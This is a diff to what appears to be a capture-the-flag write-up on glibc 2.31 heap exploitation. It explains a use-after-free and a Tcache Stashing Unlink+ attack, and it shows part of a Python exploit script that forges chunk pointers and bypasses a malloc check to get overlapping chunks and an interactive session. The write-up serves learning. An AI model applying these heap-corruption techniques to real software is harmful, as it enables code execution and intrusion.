@@ -213,7 +213,6 @@ x/gx $in_use
 # Exploit
 1. Use name "\x80" to trigger UAF in chunk idx 0 and 1.
 2. Since it uses libc 2.31 and the allocation size is 0x31 and 0x211 ( smallbin size ) we use [Tcache Stashing Unlink+](https://qianfei11.github.io/2020/05/05/Tcache-Stashing-Unlink-Attack/#Tcache-Stashing-Unlink-Attack-Plus) attack to create overlapping chunks and overwrite fd of the tcache in the list.<br>
-
 ```py
 #!/usr/bin/env python3.9
 # -*- coding: utf-8 -*-
@@ -331,7 +330,7 @@ add(b"\x09", (p(fd)   +      p(hb+0x2d0)  + b"a"*0x10   )) # 0x19d0
 add(b"\x09", (p(hb+0x2d0)  + p(hb+0x19d0) + b"b"*0x10   )) # 0x2b10
 add(b"\x09", (p(hb+0x19d0) + p(hb+0x2b10) + b"c"*0x10   ) + p(0x0)*56 + p(0) + p(0x211) + p(libc.address+0x1ebde0)*2 ) # 0x2d50 libc.address+0x1ebde0 -> main_arena+608 to bypass check in _int_malloc+215
 add(b"\x09", (p(hb+0x2f90) + p(hb+0x2f40) + b"d"*0x10   )) # 0x2f90
-add(b"\x09", (p(hb+0x2d50) + p(hb+0x2f90) + p(hb+0x2f90))) # 0x2c0
+add(b"\x09", (p(hb+0x2d50) + p(hb+0x2f90) + p(hb+0x2f90)*2)) # 0x2c0
 add(b"\x09", (p(hb+0x2b10) + p(hb+0x1790) + b"f"*0x10   )) # 0x1790
 
 # use tcache stashing unlink + to create overlapping chunks
@@ -345,7 +344,4 @@ delete(2)
 
 io.interactive()
 ```
-
-
-
 
